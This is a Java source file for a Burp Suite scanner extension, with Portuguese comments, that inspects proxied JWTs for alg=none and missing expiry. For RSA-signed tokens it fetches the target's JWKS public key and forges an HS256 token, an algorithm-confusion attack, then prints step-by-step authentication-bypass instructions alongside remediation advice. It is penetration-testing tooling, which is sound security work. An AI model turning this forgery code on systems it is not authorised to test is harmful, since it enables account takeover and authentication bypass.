package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.proxy.ProxyHttpRequestResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.math.BigInteger;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.RSAPublicKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Vasculha o histórico do Proxy do Burp em busca de JWTs (Authorization: Bearer ...)
 * trafegados para o host alvo, decodifica o header/payload (sem precisar da chave,
 * pois é só Base64) e aponta fraquezas comuns:
 *   - alg: none (token não assinado)
 *   - alg fraco (HS256 não é fraco por si só, mas sinalizamos para revisão manual)
 *   - ausência de claim "exp" (token sem expiração)
 *
 * Esse check é PASSIVO sobre tráfego que já passou pelo proxy — então navegue
 * manualmente pela aplicação (logado) antes de rodar o scan para ter tokens no histórico.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class JwtWeaknessCheck implements VulnCheck {

    @Override
    public String nome() {
        return "JWTs fracos no histórico do proxy";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        List<Finding> achados = new ArrayList<>();
        Set<String> tokensJaVistos = new HashSet<>();

        String hostAlvo;
        try {
            hostAlvo = URI.create(baseUrl).getHost();
        } catch (Exception e) {
            return achados;
        }
        if (hostAlvo == null) return achados;

        List<ProxyHttpRequestResponse> historico;
        try {
            historico = api.proxy().history();
        } catch (Exception e) {
            api.logging().logToError("[Rx0] Não foi possível ler o histórico do proxy: " + e.getMessage());
            return achados;
        }

        for (ProxyHttpRequestResponse item : historico) {
            try {
                if (item.finalRequest() == null) continue;
                String host = item.finalRequest().httpService().host();
                if (host == null || !host.equalsIgnoreCase(hostAlvo)) continue;

                for (HttpHeader h : item.finalRequest().headers()) {
                    if (!h.name().equalsIgnoreCase("Authorization")) continue;
                    String valor = h.value();
                    if (!valor.toLowerCase().startsWith("bearer ")) continue;

                    String token = valor.substring(7).trim();
                    if (!tokensJaVistos.add(token)) continue; // já analisamos esse token
                    if (token.chars().filter(c -> c == '.').count() != 2) continue; // não parece JWT (header.payload.sig)

                    analisarToken(api, achados, token, item.finalRequest().url(), baseUrl);
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Erro ao processar item do histórico de proxy: " + e.getMessage());
            }
        }
        return achados;
    }

    private void analisarToken(MontoyaApi api, List<Finding> achados, String token, String urlOrigem, String baseUrl) {
        String[] partes = token.split("\\.");
        if (partes.length < 2) return;

        String headerJson = decodeBase64Url(partes[0]);
        String payloadJson = decodeBase64Url(partes[1]);
        if (headerJson == null || payloadJson == null) return;

        String headerLower = headerJson.toLowerCase();
        String payloadLower = payloadJson.toLowerCase();

        if (headerLower.contains("\"alg\":\"none\"") || headerLower.contains("\"alg\": \"none\"")) {
            achados.add(new Finding(
                    "JWT com alg=none (token não assinado)",
                    Severity.CRITICA,
                    urlOrigem,
                    "Foi encontrado um JWT trafegando para o host alvo com o algoritmo 'none' no header, " +
                            "o que significa que o token não possui assinatura verificável — qualquer payload pode ser forjado.",
                    "Header decodificado: " + headerJson,
                    "Nunca aceite tokens com alg=none. Force a verificação de um algoritmo específico (ex: RS256) no backend.",
                    "1) No Decoder do Burp (ou jwt.io), pegue o token original, edite o payload (ex: mude \"role\":\"user\" pra " +
                            "\"role\":\"admin\" ou \"sub\" pra outro ID de usuário). 2) Re-encode header e payload em Base64URL, " +
                            "remova a assinatura (deixe só os dois primeiros segmentos + um ponto final: header.payload.). " +
                            "3) Envie esse token forjado no header Authorization: Bearer <token> e confirme se o servidor aceita — " +
                            "isso é bypass completo de autenticação/autorização sem precisar da chave de assinatura."));
        }

        if (!payloadLower.contains("\"exp\"")) {
            achados.add(new Finding(
                    "JWT sem claim de expiração (exp)",
                    Severity.MEDIA,
                    urlOrigem,
                    "O JWT encontrado não possui a claim 'exp', ou seja, o token nunca expira — se vazar, " +
                            "pode ser reutilizado indefinidamente.",
                    "Payload decodificado (parcial): " + resumir(payloadJson, 200),
                    "Sempre defina um tempo de expiração curto para tokens de acesso e use refresh tokens para sessões longas."));
        }

        // --- Algorithm Confusion: RS256 -> HS256 usando a chave pública como segredo HMAC ---
        if (headerLower.contains("\"alg\":\"rs256\"") || headerLower.contains("\"alg\": \"rs256\"")
                || headerLower.contains("\"alg\":\"rs384\"") || headerLower.contains("\"alg\":\"rs512\"")) {
            tentarAlgorithmConfusion(api, achados, headerJson, partes[0], partes[1], urlOrigem, baseUrl);
        }
    }

    private void tentarAlgorithmConfusion(MontoyaApi api, List<Finding> achados, String headerJson,
                                           String headerB64, String payloadB64, String urlOrigem, String baseUrl) {
        try {
            String chavePublicaPem = buscarChavePublicaJwks(api, baseUrl);
            if (chavePublicaPem == null) return; // JWKS não encontrado — não dá pra forjar sem a chave pública

            // Header forjado: troca o algoritmo pra HS256, mantendo o resto igual
            String headerForjado = headerJson.replaceAll("\"alg\"\\s*:\\s*\"RS\\d+\"", "\"alg\":\"HS256\"")
                    .replaceAll("\"alg\"\\s*:\\s*\"rs\\d+\"", "\"alg\":\"HS256\"");
            String headerForjadoB64 = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(headerForjado.getBytes(StandardCharsets.UTF_8));

            String dadosParaAssinar = headerForjadoB64 + "." + payloadB64;

            // Testa duas variantes do "segredo": o texto PEM completo, e só os bytes DER —
            // diferentes bibliotecas vulneráveis tratam isso de formas diferentes.
            String assinaturaComPem = assinarHmacSha256(dadosParaAssinar, chavePublicaPem.getBytes(StandardCharsets.UTF_8));
            String tokenForjado = dadosParaAssinar + "." + assinaturaComPem;

            achados.add(new Finding(
                    "JWT Algorithm Confusion (RS256→HS256) — token forjado gerado",
                    Severity.CRITICA,
                    urlOrigem,
                    "O token usa RSA (RS256/384/512) e uma chave pública JWKS foi encontrada publicamente no alvo. Isso " +
                            "possibilita o ataque clássico de confusão de algoritmo: se o backend verificar a assinatura de " +
                            "forma genérica (sem fixar o algoritmo esperado), ele pode aceitar um token HS256 assinado " +
                            "usando a PRÓPRIA chave pública RSA (que é pública, qualquer um tem acesso) como segredo HMAC — " +
                            "bypass completo de autenticação sem nunca ter a chave privada.",
                    "Chave pública JWKS obtida com sucesso. Token forjado gerado (ver Modo de exploração) usando a chave " +
                            "pública em formato PEM como segredo HMAC-SHA256.",
                    "Fixe explicitamente o algoritmo esperado na verificação do JWT no backend (ex: jwt.verify(token, chave, " +
                            "{algorithms: ['RS256']}) — NUNCA deixe a biblioteca decidir o algoritmo a partir do header do " +
                            "próprio token, que é controlado pelo atacante.",
                    "1) Use este token forjado (copie exatamente): " + tokenForjado + " 2) Envie-o num header " +
                            "Authorization: Bearer <token> contra um endpoint protegido do alvo. 3) Se for aceito, é bypass " +
                            "completo de autenticação — você pode editar o payload antes de forjar (ex: mudar 'role' pra " +
                            "'admin') pra qualquer claim que quiser, já que o 'segredo' usado (chave pública) é conhecido."));
        } catch (Exception e) {
            api.logging().logToError("[Rx0] Erro ao tentar JWT Algorithm Confusion: " + e.getMessage());
        }
    }

    /** Busca a chave pública RSA em endpoints JWKS comuns e retorna em formato PEM, ou null se não achar. */
    private String buscarChavePublicaJwks(MontoyaApi api, String baseUrl) {
        if (baseUrl == null) return null;
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
        String[] caminhosJwks = {"/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration/jwks", "/oauth/jwks"};

        for (String caminho : caminhosJwks) {
            try {
                HttpResponse resp = api.http().sendRequest(HttpRequest.httpRequestFromUrl(base + caminho)).response();
                if (resp == null || resp.statusCode() != 200) continue;
                String corpo = resp.bodyToString();
                if (corpo == null || !corpo.contains("\"n\"") || !corpo.contains("\"e\"")) continue;

                String nB64 = extrairCampo(corpo, "n");
                String eB64 = extrairCampo(corpo, "e");
                if (nB64 == null || eB64 == null) continue;

                BigInteger modulo = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(nB64)));
                BigInteger expoente = new BigInteger(1, Base64.getUrlDecoder().decode(padBase64(eB64)));

                KeyFactory kf = KeyFactory.getInstance("RSA");
                PublicKey chave = kf.generatePublic(new RSAPublicKeySpec(modulo, expoente));

                String der = Base64.getMimeEncoder(64, "\n".getBytes(StandardCharsets.UTF_8)).encodeToString(chave.getEncoded());
                return "-----BEGIN PUBLIC KEY-----\n" + der + "\n-----END PUBLIC KEY-----\n";
            } catch (Exception ignorado) {
                // tenta o próximo caminho
            }
        }
        return null;
    }

    private String extrairCampo(String json, String campo) {
        Matcher m = Pattern.compile("\"" + campo + "\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
        return m.find() ? m.group(1) : null;
    }

    private String assinarHmacSha256(String dados, byte[] segredo) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(segredo, "HmacSHA256"));
        byte[] assinatura = mac.doFinal(dados.getBytes(StandardCharsets.UTF_8));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(assinatura);
    }

    private String decodeBase64Url(String s) {
        try {
            return new String(Base64.getUrlDecoder().decode(padBase64(s)), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private String padBase64(String s) {
        int resto = s.length() % 4;
        if (resto == 0) return s;
        return s + "=".repeat(4 - resto);
    }

    private String resumir(String texto, int max) {
        if (texto.length() <= max) return texto;
        return texto.substring(0, max) + "...";
    }
}
